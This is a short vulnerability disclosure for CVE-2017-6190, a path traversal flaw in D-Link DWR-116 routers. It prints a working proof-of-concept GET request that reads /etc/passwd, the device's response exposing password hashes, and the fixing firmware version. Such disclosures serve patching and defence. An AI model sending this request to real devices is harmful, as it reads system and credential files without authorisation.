# Title: D-Link DWR-116 Arbitrary File Download
# Vendor: D-Link (www.dlink.com)
# Affected model(s): DWR-116 / DWR-116A1
# Tested on: V1.01(EU), V1.00(CP)b10, V1.05(AU)
# CVE: CVE-2017-6190
# Date: 04.07.2016
# Author: Patryk Bogdan (@patryk_bogdan)

Description:
D-Link DWR-116 with firmware before V1.05b09 suffers from vulnerability
which leads to unathorized file download from device filesystem.


PoC:

HTTP Request:
GET /uir/../../../../../../../../../../../../../../../../etc/passwd HTTP/1.1
Host: 192.168.2.1
Accept: */*
Accept-Language: en
User-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)
Connection: close

HTTP Response:
HTTP/1.0 200 OK
Content-Type: application/x-none
Cache-Control: max-age=60
Connection: close

root:$1$$taUxCLWfe3rCh2ylnFWJ41:0:0:root:/root:/bin/ash
nobody:$1$$qRPK7m23GJusamGpoGLby/:99:99:nobody:/var/usb:/sbin/nologin
ftp:$1$$qRPK7m23GJusamGpoGLby/:14:50:FTP USER:/var/usb:/sbin/nologin


Fix:
Update device to the new firmware (V1.05b09)